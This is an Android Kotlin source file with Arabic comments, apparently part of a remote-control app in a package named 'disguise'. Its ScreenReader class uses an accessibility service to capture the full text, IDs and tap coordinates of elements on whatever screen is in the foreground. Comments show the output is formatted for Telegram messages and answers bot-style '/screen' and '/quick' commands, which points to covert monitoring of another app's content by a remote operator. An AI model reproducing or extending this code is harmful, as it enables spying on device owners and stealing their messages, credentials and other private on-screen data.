package com.example.disguise.control

import android.graphics.Rect
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo

/**
 * ScreenReader — يقرأ شجرة الشاشة الحالية ويحوّلها إلى نص منسق.
 *
 * يعتمد على AccessibilityHelper.instance.rootInActiveWindow،
 * لذا يجب أن تكون خدمة إمكانية الوصول مفعّلة قبل استخدامه.
 *
 * الميزات:
 * - dump(): شجرة كاملة بتفاصيل (class, text, id, bounds, خصائص).
 * - quickSummary(): ملخص سريع للعناصر التفاعلية فقط.
 *
 * حدود صارمة لتجنب:
 * - شجرات عملاقة (MAX_DEPTH, MAX_NODES).
 * - رسائل تيليجرام ضخمة (MAX_OUTPUT_LEN).
 * - تسلسل لانهائي (safety checks).
 *
 * ⚠️ ملاحظة: walk() لم تعد inline (لأنها تكراريّة — Kotlin يمنع
 * inline مع recursion). نستخدم IntArray(1) كعدّاد بدلاً من var مغلق.
 */
class ScreenReader {

    companion object {
        private const val TAG = "ScreenReader"

        /** أقصى عمق للتسلسل الهرمي */
        private const val MAX_DEPTH = 30

        /** أقصى عدد عقد نعالجها */
        private const val MAX_NODES = 3000

        /** أقصى طول نص لكل عقدة */
        private const val MAX_TEXT_LEN = 100

        /** أقصى طول للناتج الكلي (أقل من حد تيليجرام 4096) */
        private const val MAX_OUTPUT_LEN = 3500
    }

    /**
     * يقرأ الشاشة الحالية ويعيدها كنص منسق.
     */
    fun dump(): String {
        val service = AccessibilityHelper.instance
            ?: return "⚠️ خدمة إمكانية الوصول غير مفعّلة."

        val root = service.rootInActiveWindow
            ?: return "⚠️ لا يمكن قراءة الشاشة الحالية (root == null). قد يكون التطبيق محمياً."

        val sb = StringBuilder()
        sb.append("📱 package: ").append(root.packageName ?: "?").append("\n")
        sb.append("═══════════════════════════\n")

        // ✅ عدّاد عبر IntArray (بديل آمن عن inline + var مغلق)
        val counter = intArrayOf(0)
        walk(root, sb, 0, counter)
        val nodeCount = counter[0]

        sb.append("═══════════════════════════\n")
        sb.append("📊 إجمالي العقد: ").append(nodeCount).append("\n")

        var result = sb.toString()
        if (result.length > MAX_OUTPUT_LEN) {
            result = result.substring(0, MAX_OUTPUT_LEN) +
                    "\n\n⚠️ تم قطع الناتج (طويل جداً). استخدم /screen على شاشة أصغر."
        }
        Log.d(TAG, "dump: $nodeCount nodes, ${result.length} chars")
        return result
    }

    /**
     * السير التكراري (DFS) على الشجرة.
     * ✅ ليست inline (لأنها تكراريّة).
     * العدّاد يُمرّر كـ IntArray(1) لتجنّب closures.
     */
    private fun walk(
        node: AccessibilityNodeInfo,
        sb: StringBuilder,
        depth: Int,
        counter: IntArray
    ) {
        if (depth > MAX_DEPTH) return
        if (sb.length > MAX_OUTPUT_LEN) return
        if (counter[0] >= MAX_NODES) return

        counter[0]++

        val indent = "  ".repeat(depth)
        val cls = node.className?.toString()?.substringAfterLast('.') ?: "?"
        val text = node.text?.toString()?.take(MAX_TEXT_LEN) ?: ""
        val desc = node.contentDescription?.toString()?.take(MAX_TEXT_LEN) ?: ""
        val viewId = node.viewIdResourceName ?: ""
        val bounds = Rect().also { node.getBoundsInScreen(it) }

        // السطر الأساسي
        sb.append(indent).append(cls)

        // معرّف العرض (مختصر)
        if (viewId.isNotBlank()) {
            sb.append(" #").append(viewId.substringAfterLast('/'))
        }

        // النص والوصف
        if (text.isNotBlank()) sb.append(" text=\"").append(escape(text)).append("\"")
        if (desc.isNotBlank()) sb.append(" desc=\"").append(escape(desc)).append("\"")

        // الإحداثيات
        sb.append(" [").append(bounds.left).append(",").append(bounds.top)
            .append("-").append(bounds.right).append(",").append(bounds.bottom).append("]")

        // الخصائص المهمة
        if (node.isClickable) sb.append(" click")
        if (node.isEditable) sb.append(" edit")
        if (node.isFocused) sb.append(" focus")
        if (node.isScrollable) sb.append(" scroll")
        if (node.isCheckable) sb.append(if (node.isChecked) " checked" else " checkable")
        if (!node.isEnabled) sb.append(" disabled")
        if (!node.isVisibleToUser) sb.append(" invisible")

        sb.append("\n")

        // الأبناء
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            walk(child, sb, depth + 1, counter)
        }
    }

    /**
     * تنظيف النص من الأحرف التي قد تكسر تنسيق تيليجرام.
     */
    private fun escape(s: String): String {
        return s
            .replace("\n", "\\n")
            .replace("\r", "")
            .replace("\t", " ")
    }

    /**
     * ملخص سريع للشاشة: العناصر القابلة للنقر والكتابة فقط.
     * مفيد لأمر /quick (إن أضفته لاحقاً إلى CommandHandler).
     */
    fun quickSummary(): String {
        val service = AccessibilityHelper.instance ?: return "⚠️ الخدمة غير مفعّلة"
        val root = service.rootInActiveWindow ?: return "⚠️ لا يمكن قراءة الشاشة"

        val sb = StringBuilder()
        sb.append("📱 ").append(root.packageName ?: "?").append("\n")

        val queue = ArrayDeque<Pair<AccessibilityNodeInfo, Int>>()
        queue.add(root to 0)
        var count = 0
        var found = 0

        while (queue.isNotEmpty() && count < MAX_NODES && found < 50) {
            count++
            val (node, depth) = queue.removeFirst()
            if (depth > MAX_DEPTH) continue

            if (node.isClickable || node.isEditable) {
                found++
                val cls = node.className?.toString()?.substringAfterLast('.') ?: "?"
                val text = (node.text ?: node.contentDescription)?.toString()?.take(60) ?: ""
                val b = Rect().also { node.getBoundsInScreen(it) }
                val cx = (b.left + b.right) / 2
                val cy = (b.top + b.bottom) / 2

                sb.append(if (node.isEditable) "✏️" else "👆")
                    .append(" ").append(cls)
                if (text.isNotBlank()) sb.append(" \"").append(escape(text)).append("\"")
                sb.append(" → (").append(cx).append(",").append(cy).append(")\n")
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                queue.add(child to (depth + 1))
            }
        }

        if (found == 0) sb.append("(لا عناصر تفاعلية)")
        else sb.append("\n📊 ").append(found).append(" عنصر تفاعلي")

        return sb.toString()
    }
}
